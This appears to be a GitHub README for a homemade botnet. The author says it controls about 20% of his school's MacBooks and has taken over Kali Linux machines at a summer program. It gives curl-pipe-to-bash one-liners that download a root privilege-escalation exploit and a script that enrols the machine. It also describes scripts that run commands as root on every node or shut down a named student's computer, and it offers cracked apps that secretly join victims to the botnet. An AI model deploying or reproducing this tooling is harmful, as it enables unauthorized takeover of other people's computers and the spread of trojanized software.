# net
Some code which I use to run a rudimentary botnet which controls roughly 20% of the MacBooks my school provides to students. I've also used this code to take over Kali Linux computers at a summer program and write new join scripts for different  

## Where this code works
* MacBook Airs at George Mason High School or others running Mac OS X 10.11.6 and immediately preceding versions. Some assumptions were made about configuration for Macs since the code was written specifically for GMHS MacBook Airs.
* Debian-based Linux distributions, originally Kali Linux. Should work on other distros, although the user must be logged in as rootto the GUI, which they only usually are on Kali.

I do not endorse the use of this code for malicious purposes.

## How it works
### Listening
The botnet is controlled by a simple Python script which opens a socket on port `2043`. Currently the server simply listens for incoming connections and accepts data on new nodes, which are then stored in `nodes.txt`.

### Joining
For Macs, two scripts are used to join a computer to the network, `join.sh` and `enact.sh`. `join.sh` allows one-run joining: it will download the exploit needed to elevate to a root shell and then run `enact.sh` in that root shell automatically, which will handle joining the botnet. This mitigates the need to manually download the exploit, mark it as executable, run it, bla bla bla. Just run this script and you'll be good.

For Kali or other Debian-based Linux, there's just one script which must be executed as root. Some code to use a Rubber Duck USB as a delivery mechanism can be found [here](https://github.com/ErikBoesen/duck-kali) 

Here are simple one-liners to join the botnet (all the scripts are up on my website for URL simplicity):

Mac:
```sh
curl -L erikboesen.com/join.sh |bash
```
Kali:
```sh
curl -L erikboesen.com/jk.sh |bash
```

### Controlling
Running `run.sh` followed by a string giving the command you'd like to run will cause all nodes in `nodes.txt` (in your working directory) to run that command as root. You can also run `up.sh` to view which/how many nodes are online. `die.sh` will kill open applications, turn off the screen, and initiate shutdown on the computer owned by the student with the provided username. Note: Don't do this.  

### Apps
The `apps` directory contains some cracked versions of various applications which are blocked on GMHS MacBooks. These versions will work on our MacBooks, but they will also join the computer that runs them to the botnet.

## Licensing
This software was created by [Erik Boesen](https://github.com/ErikBoesen) and is available under the [MIT License](LICENSE).
